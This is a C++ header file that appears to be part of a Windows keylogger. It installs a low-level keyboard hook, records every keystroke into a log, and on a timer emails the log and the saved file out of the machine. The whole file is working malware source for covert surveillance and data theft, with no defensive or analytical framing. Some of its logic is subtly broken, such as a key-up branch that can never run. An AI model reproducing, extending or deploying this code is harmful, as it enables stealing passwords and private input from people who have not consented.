#pragma once

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
#include <string>
std::string keylog ="";

void TimerSendMail()
{
    if(keylog.empty())
    {
        return;
    }
    std::string last_file =IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog '"+ keylog + "'");
        return;

    }
    int x = Mail::SendMail("Log [" +last_file+"]",
                           "Hi :)\nThe File has been attached to this mail :)\nFor testing, enjoy:\n"+
                           keylog,IO::GetOurPath(true)+last_file);

    if(x!=7)
    {
        Helper::WriteAppLog("Mail was not send! Error code: "+Helper::ToString(x));

    }
    else
    {
        keylog ="";
    }
}

Timer MailTimer(TimerSendMail, 200*60,Timer::Infinite);

HHOOK eHook =NULL;

LRESULT OurKeyboardProc (int nCode, WPARAM wparam,LPARAM lparam)
{
    if(nCode<0)
    {
        CallNextHookEx(eHook,nCode,wparam,lparam);
    }
    // READ ABOUT é   KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].name;
        if(kbs->vkCode ==VK_RETURN)
        {
            keylog +='\n';
        }
        else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
        {
            DWORD key = kbs->vkCode;
            if(key==VK_CONTROL
               ||key==VK_LCONTROL
               ||key==VK_RCONTROL
               ||key==VK_SHIFT
               ||key==VK_RSHIFT
               ||key==VK_LSHIFT
               ||key==VK_MENU
               ||key==VK_LMENU
               ||key==VK_CAPITAL
               ||key==VK_NUMLOCK
               ||key==VK_LWIN
               ||key==VK_RWIN)
            {
                std::string KeyName =Keys::KEYS[kbs->vkCode].name;
                KeyName.insert(1,"/");
                keylog +=KeyName;

            }


        }
    }
    return CallNextHookEx(eHook,nCode,wparam,lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("hook started...... timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL),0);
    return eHook==NULL;
}
bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook =NULL;
    return (bool)b;
}
bool IsHooked()
{
    return (bool)(eHook ==NULL);
}





